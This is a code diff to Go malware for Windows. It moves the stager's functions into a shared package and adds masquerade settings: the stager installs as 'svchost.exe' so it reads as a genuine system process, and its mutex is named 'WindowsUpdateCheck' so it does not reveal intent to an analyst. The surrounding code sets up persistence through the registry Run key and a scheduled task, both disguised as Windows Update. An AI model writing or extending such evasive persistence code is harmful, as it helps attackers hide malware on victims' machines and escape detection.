@@ -1,4 +1,4 @@
-package main
+package common
 
 import (
 	"fmt"
@@ -12,7 +12,17 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-func installSelf() {
+// INSTALL_NAME is the on-disk masquerade name for the stager.
+// svchost.exe reads as a legit, feared system process to casual users,
+// and (unlike lsass/csrss) does not trip the protected-process alarm.
+var INSTALL_NAME = "svchost.exe"
+
+// MUTEX_NAME must NOT advertise intent to an analyst.
+var MUTEX_NAME = "Global\\WindowsUpdateCheck"
+
+var mutexHandle windows.Handle
+
+func InstallSelf() {
 	exePath, err := os.Executable()
 	if err != nil {
 		return
@@ -45,7 +55,7 @@ func installSelf() {
 	os.Exit(0)
 }
 
-func checkForMutex() bool {
+func CheckForMutex() bool {
 	name, _ := windows.UTF16PtrFromString(MUTEX_NAME)
 	handle, err := windows.CreateMutex(nil, false, name)
 	if err != nil {
@@ -59,13 +69,13 @@ func checkForMutex() bool {
 	return true
 }
 
-func releaseMutex() {
+func ReleaseMutex() {
 	if mutexHandle != 0 {
 		windows.CloseHandle(mutexHandle)
 	}
 }
 
-func installRegistryPersistence() {
+func InstallRegistryPersistence() {
 	appData, _ := os.UserConfigDir()
 	destPath := filepath.Join(appData, INSTALL_NAME)
 
@@ -82,7 +92,7 @@ func installRegistryPersistence() {
 	key.SetStringValue("WindowsUpdateService", destPath)
 }
 
-func installScheduledTask() {
+func InstallScheduledTask() {
 	appData, _ := os.UserConfigDir()
 	destPath := filepath.Join(appData, INSTALL_NAME)
 
@@ -98,7 +108,7 @@ func installScheduledTask() {
 	cmd.Run()
 }
 
-func uninstallPersistence() error {
+func UninstallPersistence() error {
 	var errMsgs []string
 	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
 	if err == nil {
@@ -113,7 +123,7 @@ func uninstallPersistence() error {
 		errMsgs = append(errMsgs, fmt.Sprintf("Task: %v", err))
 	}
 	if len(errMsgs) > 0 {
-		return fmt.Errorf(strings.Join(errMsgs, "; "))
+		return fmt.Errorf("%s", strings.Join(errMsgs, "; "))
 	}
 	return nil
 }
